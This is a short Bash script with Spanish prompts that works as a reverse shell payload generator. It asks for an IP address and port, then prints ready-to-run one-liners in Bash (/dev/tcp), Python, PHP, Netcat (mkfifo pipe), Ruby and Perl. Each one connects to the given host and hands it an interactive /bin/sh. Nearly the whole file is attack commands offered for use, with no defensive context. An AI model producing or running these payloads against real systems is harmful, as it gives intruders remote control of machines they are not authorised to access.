#!/bin/bash

echo "1. Reverse shell Bash"
echo "2. Reverse shell Python"
echo "3. Reverse shell Php"
echo "4. Reverse shell Netcat"
echo "5. Reverse shell Ruby"
echo "6. Reverse shell Perl"
echo "7. salir"



function func()
{
   echo "Salindo"
   exit 1
}

echo "introduzca una numero [1-7] : "
read option

if [ $option == 1 ]; then
	echo "bash"
	echo "introduzca una dirección IP:"
	read ip
	echo "introduzca el port:"
	read port
	echo "----------------------------------------"
	echo "bash -i >& /dev/tcp/$ip/$port 0>&1"
	echo "----------------------------------------"
elif [ $option == 2 ]; then
	echo "Python"
    echo "introduzca una dirección IP:"
    read ip
    echo "introduzca el port:"
    read port
    echo "----------------------------------------"
    echo "python3 -c 'import socket,os,pty;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(("\"$ip"\",$port));os.dup2(s.fileno(),0);os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);pty.spawn("'"/bin/sh"'")'"
    echo "----------------------------------------"
elif [ $option == 3 ]; then
	echo "Php"
	echo "introduzca una dirección IP:"
	read ip
	echo "introduzca el port:"
	read port
	echo "----------------------------------------"
	echo "php -r '$sock=fsockopen("\"$ip"\",$port);system("'"/bin/sh -i <&3 >&3 2>&3"'");'"
	echo "----------------------------------------"
elif [ $option == 4 ]; then
	echo "Netcat"
	echo "introduzca una dirección IP:"
	read ip
	echo "introduzca el port:"
	read port
	echo "----------------------------------------"
	echo "rm -f /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc $ip $port >/tmp/f"
	echo "----------------------------------------"
elif [ $option == 5 ]; then
	echo "Ruby"
	echo "introduzca una dirección IP:"
	read ip
	echo "introduzca el port:"
	read port
	echo "----------------------------------------"
	echo "ruby -rsocket -e'f=TCPSocket.open("\"$ip"\",$port).to_i;exec sprintf("'"/bin/sh -i <&%d >&%d 2>&%d"'",f,f,f)'"
	echo "----------------------------------------"
elif [ $option == 6 ]; then
	echo "perl"
	echo "introduzca una dirección IP:"
	read ip
	echo "introduzca el port:"
	read port
	echo "----------------------------------------"
	echo "perl -e 'use Socket;$i="\"$ip"\";$p=$port;socket(S,PF_INET,SOCK_STREAM,getprotobyname("'"tcp"'"));if(connect(S,sockaddr_in($p,inet_aton($i)))){open(STDIN,"'">&S"'");open(STDOUT,"'">&S"'");open(STDERR,"'">&S"'");exec("'"/bin/sh -i"'");};'"
	echo "----------------------------------------"
elif [ $option == 7 ]; then
	func
fi

